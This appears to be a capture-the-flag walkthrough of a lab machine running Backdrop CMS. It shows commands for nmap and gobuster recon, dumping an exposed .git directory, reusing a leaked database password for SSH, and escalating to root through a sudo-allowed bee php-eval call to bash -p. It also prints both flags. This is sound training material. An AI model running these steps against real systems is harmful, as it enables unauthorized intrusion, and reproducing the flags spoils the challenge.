Let's scan the IP address
```bash
sudo nmap -v -sC -sV 10.10.11.58
```

![image](images/20250310193559.png)

Go to the site

![image](images/20250310193656.png)

Use `gobuster` to search directories
```bash
gobuster dir -u http://10.10.11.58/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

![image](images/20250310200600.png)

Go to the `/files` directory

![image](images/20250310200022.png)

`README` says that this directory is used to store downloaded files.

Let's try to find `.git` in the site directories

![image](images/20250312191944.png)

Using the `GitHack` tool, download the entire project. You can download it [here](https://github.com/lijiejie/GitHack)
```bash
python GitHack.py http://dog.htb/.git/
```

![image](images/20250312193027.png)


![image](images/20250312193043.png)

Let's see the interesting contents of the files.
`settings.php`:
```PHP
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';
```
Getting the password from the database and possibly from some user
```Password
BackDropJ2024DS2024
```
Finding (not yet) the user `johncusack`. Let's try to connect to it via `SSH` using the previous password
```bash
ssh johncusack@10.10.11.58
```

![image](images/20250312202224.png)

First flag found
```flag
f13a75dfbe946b65f1012d30f28a6a05
```
Let's see what `sudo` commands this user can execute
```bash
sudo -l
```

![image](images/20250312210610.png)

**`/usr/local/bin/bee`** - utility for managing `Backdrop CMS`
Let's rustle this utility
```bash
sudo /usr/local/bin/bee
```

![image](images/20250312211607.png)


![image](images/20250312213031.png)

The instructions for using this utility are displayed. Of interest here are the flags `--root`, which specifies the root directory of `Backdrop` (most likely `/var/www/html`), and `php-eval`, which allows you to execute arbitrary PHP code. Since this script runs as `root`, we can inject a shell into the command and gain access to `root`
```bash
sudo /usr/local/bin/bee --root=/var/www/html php-eval 'system("bash -p");'
```
, where **`system()`** is a PHP function for executing shell commands, **`bash -p`** is the `-p` flag that preserves privileges.

![image](images/20250312212122.png)

```flag
b123db2203d8c50d3b89f43169f50037
```
<div style="page-break-after: always;"></div>

> [!info] Note
> Specifying /var/www/html helped the bee utility:
1 Find Backdrop CMS files
2 Fully initialize your environment (bootstrap)
